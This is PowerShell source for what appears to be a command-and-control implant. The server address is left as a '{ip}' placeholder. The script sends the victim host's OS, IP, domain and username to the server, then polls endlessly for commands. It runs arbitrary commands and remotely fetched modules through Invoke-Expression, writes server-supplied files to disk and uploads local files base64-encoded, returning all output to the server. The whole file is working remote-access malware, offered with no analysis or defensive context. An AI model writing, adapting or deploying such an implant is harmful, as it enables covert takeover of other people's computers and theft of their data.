$hostname = $env:COMPUTERNAME;
$whoami = $env:USERNAME;
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption;
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
$IP = (gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$random = -join ((65 .. 90) | Get-Random -Count 5 | % { [char]$_ });
$agent = "$random-img.jpeg"
$finaldata = "$os**$IP**$arch**$hostname**$domain**$whoami"
$h3 = new-object net.WebClient
$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
$h = $h3.UploadString("http://{ip}:9090/info/$agent", "data="+$finaldata)

$h2 = New-Object system.Net.WebClient;
$h3 = New-Object system.Net.WebClient;


function load($module)
{
	
	
	
	$handle = new-object net.WebClient;
	$handleh = $handle.Headers;
	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
	$modulecontent = $handle.UploadString("http://{ip}:9090/md/$agent", "data="+"$module");
	
	
	
	return $modulecontent
}

function Download($file)
{
	
	
	
	$handle = new-object net.WebClient;
	$handleh = $handle.Headers;
	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
	$modulecontent = $handle.UploadString("http://{ip}:9090/up/$agent", "data="+"$file");
	return $modulecontent
}

function upload($file)
{
	
	
	
	$handle = new-object net.WebClient;
	$handleh = $handle.Headers;
	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
	$modulecontent = $handle.UploadString("http://{ip}:9090/img/$agent", "data="+"$file");
	return $modulecontent
}


while ($true)
{
	$cmd = $h2.downloadString("http://{ip}:9090/cm/$agent");
	#echo $cmd
	if ($cmd -eq "REGISTER")
	{
		$h3 = new-object net.WebClient
		$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
		$h3.UploadString("http://{ip}:9090/info/$agent", "data="+$finaldata)
		continue
	}
	if ($cmd -eq "")
	{
		sleep 2
		continue
	}
	elseif ($cmd.split(" ")[0] -eq "load")
	{
		$f = $cmd.split(" ")[1]
		$module = load -module $f
		try
		{
			$output = Invoke-Expression ($module) | Out-String
		}
		catch
		{
			$output = $Error[0] | Out-String;
		}
		
		
	}
	elseif ($cmd.split(" ")[0] -eq "download")
	{
        try
		{
			$file = $cmd.split(" ")[1]
            echo $file
		    $path = $cmd.split(" ")[2]
            echo $path
            $filedata=Download -file $file
		    $bytes = [Convert]::FromBase64String($filedata)
		    [IO.File]::WriteAllBytes($path, $bytes)
		    $output="download file to $path"
		}
		catch
		{
			$output = "err download file"
		}
		
	}
	elseif ($cmd.split(" ")[0] -eq "upload")
	{
        try
		{
			$path = $cmd.split(" ")[1]
            #echo $file
            $filedata=[IO.File]::ReadAllBytes($path)
            $bytes = [Convert]::ToBase64String($filedata)
            echo $bytes
		    $output=upload -file $bytes
		}
		catch
		{
			$output = "err upload file"
		}
		
	}

	else
	{
		
		try
		{
			$output = Invoke-Expression ($cmd) | Out-String
		}
		catch
		{
			#$output = $Error[0] | Out-String;
		}
	}
    #Echo $output
	$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
	$redata = [System.Convert]::ToBase64String($bytes)
    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
	$re = $h3.UploadString("http://{ip}:9090/re/$agent", "data="+$redata);
	
}

